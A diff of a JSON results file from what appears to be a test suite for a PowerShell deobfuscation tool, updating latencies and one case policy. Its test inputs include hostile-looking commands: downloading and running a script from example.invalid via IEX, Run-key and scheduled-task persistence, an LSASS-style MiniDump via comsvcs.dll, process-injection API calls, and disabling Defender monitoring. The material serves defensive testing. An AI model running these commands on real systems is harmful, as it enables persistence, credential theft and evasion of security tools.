@@ -4,7 +4,7 @@
   "behavior_cases": 7,
   "behavior_correct": 0,
   "recipe_correct": 43,
-  "peak_process_rss_kib": 24692,
+  "peak_process_rss_kib": 16256,
   "results": [
     {
       "name": "utf8",
@@ -18,7 +18,7 @@
         "value": "Write-Output 'hello'"
       },
       "canonical": true,
-      "latency_ms": 53.147,
+      "latency_ms": 15.376,
       "nodes": 3,
       "generated_bytes": 40
     },
@@ -34,7 +34,7 @@
         "value": "Write-Output 'hello'"
       },
       "canonical": true,
-      "latency_ms": 0.352,
+      "latency_ms": 0.291,
       "nodes": 3,
       "generated_bytes": 60
     },
@@ -50,7 +50,7 @@
         "value": "Write-Output 'hello'"
       },
       "canonical": true,
-      "latency_ms": 0.284,
+      "latency_ms": 0.393,
       "nodes": 4,
       "generated_bytes": 80
     },
@@ -66,7 +66,7 @@
         "value": "Write-Output 'hello'"
       },
       "canonical": true,
-      "latency_ms": 0.392,
+      "latency_ms": 0.206,
       "nodes": 4,
       "generated_bytes": 68
     },
@@ -82,7 +82,7 @@
         "value": "Write-Output 'hello'"
       },
       "canonical": true,
-      "latency_ms": 0.456,
+      "latency_ms": 0.403,
       "nodes": 6,
       "generated_bytes": 242
     },
@@ -98,7 +98,7 @@
         "value": "Write-Output 'hello'"
       },
       "canonical": true,
-      "latency_ms": 0.497,
+      "latency_ms": 0.472,
       "nodes": 4,
       "generated_bytes": 116
     },
@@ -114,7 +114,7 @@
         "value": "Write-Output 'hello'"
       },
       "canonical": true,
-      "latency_ms": 0.26,
+      "latency_ms": 0.355,
       "nodes": 2,
       "generated_bytes": 20
     },
@@ -130,7 +130,7 @@
         "value": "Write-Output 'hello'"
       },
       "canonical": true,
-      "latency_ms": 0.158,
+      "latency_ms": 0.168,
       "nodes": 2,
       "generated_bytes": 20
     },
@@ -146,7 +146,7 @@
         "value": "aGVsbG8="
       },
       "canonical": false,
-      "latency_ms": 0.186,
+      "latency_ms": 0.19,
       "nodes": 2,
       "generated_bytes": 8
     },
@@ -162,7 +162,7 @@
         "value": "$b='aGVsbG8='; Write-Output ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))"
       },
       "canonical": false,
-      "latency_ms": 0.184,
+      "latency_ms": 0.195,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -178,7 +178,7 @@
         "value": "Write-Output (-join [char[]](104,101,108,108,111))"
       },
       "canonical": false,
-      "latency_ms": 0.082,
+      "latency_ms": 0.092,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -194,7 +194,7 @@
         "value": "Write-Output (('he','llo') -join '')"
       },
       "canonical": false,
-      "latency_ms": 0.065,
+      "latency_ms": 0.099,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -210,7 +210,7 @@
         "value": "Write-Output ('{1}{0}' -f 'llo','he')"
       },
       "canonical": false,
-      "latency_ms": 0.056,
+      "latency_ms": 0.065,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -226,7 +226,7 @@
         "value": "$a='he'; $b='llo'; Write-Output ($a+$b)"
       },
       "canonical": false,
-      "latency_ms": 0.059,
+      "latency_ms": 0.061,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -242,7 +242,7 @@
         "value": "$a='hello'; Write-Output ('{0}!' -f $a)"
       },
       "canonical": false,
-      "latency_ms": 0.054,
+      "latency_ms": 0.068,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -258,7 +258,7 @@
         "value": "Write-Output (-join (111,98,107,107,104 | ForEach-Object { [char]($_ -bxor 7) }))"
       },
       "canonical": false,
-      "latency_ms": 0.1,
+      "latency_ms": 0.123,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -274,7 +274,7 @@
         "value": "Write-Output (-join (107,104,111,111,114 | ForEach-Object { [char]($_ - 3) }))"
       },
       "canonical": false,
-      "latency_ms": 0.094,
+      "latency_ms": 0.102,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -290,7 +290,7 @@
         "value": "Write-Output (-join (101,98,105,105,108 | ForEach-Object { [char]($_ + 3) }))"
       },
       "canonical": false,
-      "latency_ms": 0.093,
+      "latency_ms": 0.123,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -306,7 +306,7 @@
         "value": "Write-Output (-join [char[]](0x68,0x65,0x6c,0x6c,0x6f))"
       },
       "canonical": false,
-      "latency_ms": 0.079,
+      "latency_ms": 0.08,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -322,7 +322,7 @@
         "value": "echo hello"
       },
       "canonical": true,
-      "latency_ms": 0.176,
+      "latency_ms": 0.162,
       "nodes": 2,
       "generated_bytes": 10
     },
@@ -338,7 +338,7 @@
         "value": "Write-Output 'hello'"
       },
       "canonical": false,
-      "latency_ms": 0.483,
+      "latency_ms": 1.16,
       "nodes": 8,
       "generated_bytes": 304
     },
@@ -354,7 +354,7 @@
         "value": "cmd /v:on /c \"set x=hello&&echo !x!\""
       },
       "canonical": false,
-      "latency_ms": 0.076,
+      "latency_ms": 0.064,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -370,7 +370,7 @@
         "value": "cmd /c \"set x=hello&&echo %x%\""
       },
       "canonical": false,
-      "latency_ms": 0.04,
+      "latency_ms": 0.036,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -386,7 +386,7 @@
         "value": "cmd /v:on /c \"set x=hello&whoami&&echo !x!\""
       },
       "canonical": false,
-      "latency_ms": 0.054,
+      "latency_ms": 0.052,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -402,7 +402,7 @@
         "value": "Write-Output 'hello'"
       },
       "canonical": false,
-      "latency_ms": 0.311,
+      "latency_ms": 0.271,
       "nodes": 4,
       "generated_bytes": 68
     },
@@ -418,7 +418,7 @@
         "value": "Write-Output $env:PATH"
       },
       "canonical": false,
-      "latency_ms": 0.056,
+      "latency_ms": 0.052,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -434,7 +434,7 @@
         "value": "IEX (Get-Content unknown.ps1)"
       },
       "canonical": false,
-      "latency_ms": 0.231,
+      "latency_ms": 0.252,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -450,7 +450,7 @@
         "value": "Write-Output (-join (104,101 | ForEach-Object { Start-Process anything; [char]$_ }))"
       },
       "canonical": false,
-      "latency_ms": 0.133,
+      "latency_ms": 0.114,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -466,7 +466,7 @@
         "value": "Write-Output (-join (111,98 | ForEach-Object { [char]($_ -bxor $key) }))"
       },
       "canonical": false,
-      "latency_ms": 0.096,
+      "latency_ms": 0.094,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -482,7 +482,7 @@
         "value": "[AES]::Decrypt($cipher,$key)"
       },
       "canonical": false,
-      "latency_ms": 0.057,
+      "latency_ms": 0.055,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -514,7 +514,7 @@
         "value": "$a='hello'; if($x){$a='bye'}; Write-Output $a"
       },
       "canonical": false,
-      "latency_ms": 0.067,
+      "latency_ms": 0.068,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -530,13 +530,13 @@
         "value": "Write-Output ('x'+1)"
       },
       "canonical": false,
-      "latency_ms": 0.046,
+      "latency_ms": 0.045,
       "nodes": 1,
       "generated_bytes": 0
     },
     {
       "name": "truncated_gzip",
-      "policy": "refuse",
+      "policy": "partial",
       "correct": true,
       "behavior_correct": true,
       "recipe_correct": true,
@@ -546,7 +546,7 @@
         "value": "Write-Output 'hello'"
       },
       "canonical": false,
-      "latency_ms": 0.252,
+      "latency_ms": 0.278,
       "nodes": 4,
       "generated_bytes": 76
     },
@@ -562,7 +562,7 @@
         "value": "Get-Service"
       },
       "canonical": false,
-      "latency_ms": 0.101,
+      "latency_ms": 0.098,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -578,7 +578,7 @@
         "value": "Write-Output 'hello'"
       },
       "canonical": false,
-      "latency_ms": 0.05,
+      "latency_ms": 0.049,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -594,7 +594,7 @@
         "value": "Write-Output 'IEX DownloadString VirtualAlloc schtasks'"
       },
       "canonical": false,
-      "latency_ms": 0.056,
+      "latency_ms": 0.085,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -610,7 +610,7 @@
         "value": "IEX (Invoke-WebRequest 'https://example.invalid/hello.ps1')"
       },
       "canonical": false,
-      "latency_ms": 0.165,
+      "latency_ms": 0.11,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -626,7 +626,7 @@
         "value": "schtasks /create /tn Demo /tr \"notepad.exe\" /sc ONLOGON"
       },
       "canonical": false,
-      "latency_ms": 0.079,
+      "latency_ms": 0.077,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -642,7 +642,7 @@
         "value": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Demo /d notepad.exe"
       },
       "canonical": false,
-      "latency_ms": 0.119,
+      "latency_ms": 0.149,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -658,7 +658,7 @@
         "value": "rundll32.exe comsvcs.dll, MiniDump 123 C:\\Temp\\demo.dmp full"
       },
       "canonical": false,
-      "latency_ms": 0.089,
+      "latency_ms": 0.091,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -674,7 +674,7 @@
         "value": "[Native]::VirtualAlloc(); [Native]::WriteProcessMemory(); [Native]::CreateRemoteThread()"
       },
       "canonical": false,
-      "latency_ms": 0.139,
+      "latency_ms": 0.115,
       "nodes": 1,
       "generated_bytes": 0
     },
@@ -690,7 +690,7 @@
         "value": "Set-MpPreference -DisableRealtimeMonitoring $true"
       },
       "canonical": false,
-      "latency_ms": 0.074,
+      "latency_ms": 0.072,
       "nodes": 1,
       "generated_bytes": 0
     }
